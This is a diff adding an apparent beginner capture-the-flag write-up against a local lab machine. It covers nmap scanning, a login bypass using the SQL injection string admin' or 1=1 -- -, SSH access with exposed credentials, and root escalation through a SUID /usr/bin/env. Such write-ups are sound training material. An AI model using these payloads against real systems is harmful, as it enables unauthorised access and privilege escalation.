@@ -1,0 +1,45 @@
+Date: 18/05/2025  
+Level: Beginner  
+Tags: SQL Injection  
+
+---
+
+1. Reconnaissance
+
+The initial step was to verify connectivity to the target machine:
+    ping -c 1 172.17.0.2
+The host responded successfully, confirming network access.
+A full TCP port scan was performed to identify open services:
+    nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2
+Open ports discovered:
+- 22/tcp – SSH  
+- 80/tcp – HTTP  
+A more detailed scan was then performed:
+    sudo nmap -sCV -p22,80 -v 172.17.0.2
+This revealed that port 80 was running an Apache HTTP server. Accessing the web service via browser presented a login form.
+
+---
+
+2. Exploitation
+
+A classic SQL injection was used to bypass the login mechanism:
+- Username: admin' or 1=1 -- -  
+- Password: Any value (e.g., 1234)
+The injection was successful, and access to the application was granted. This revealed valid SSH credentials.
+An SSH session was then established using the discovered credentials:
+    ssh username@172.17.0.2
+---
+3. Privilege Escalation
+
+After logging in, user privileges were verified:
+    whoami
+The current user was unprivileged. A check for sudo permissions confirmed no elevated rights:
+    sudo -l
+Next, the system was scanned for SUID binaries:
+    find / -perm -4000 2>/dev/null
+Among the results, /usr/bin/env was identified as a viable vector. A shell was invoked with elevated privileges:
+    /usr/bin/env /bin/sh -p
+
+
+
+
